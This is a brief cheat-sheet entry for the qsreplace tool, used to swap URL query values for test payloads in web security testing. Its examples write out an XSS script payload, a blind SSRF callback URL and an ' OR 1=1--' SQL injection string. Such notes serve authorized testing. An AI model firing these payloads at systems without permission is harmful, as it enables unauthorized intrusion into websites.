# qsreplace

## What it is
A tool by tomnomnom to replace all query string values in a list of URLs with a custom payload. Essential for mass-testing XSS, SQLi, or SSRF payloads.

---

## Key Flags
| Flag | Description |
|------|-------------|
| `-a` | Append the payload instead of replacing the original value |

---

## Examples

**Replace all parameter values with an XSS payload**
```bash
cat urls.txt | qsreplace '"><script>alert(1)</script>'
```

**Replace all parameter values with a blind SSRF payload**
```bash
cat urls.txt | qsreplace 'http://burpcollaborator.net'
```

**Append a payload instead of replacing**
```bash
cat urls.txt | qsreplace -a ' OR 1=1--'
```

**Remove all parameter values (leave them empty)**
```bash
cat urls.txt | qsreplace ''
```
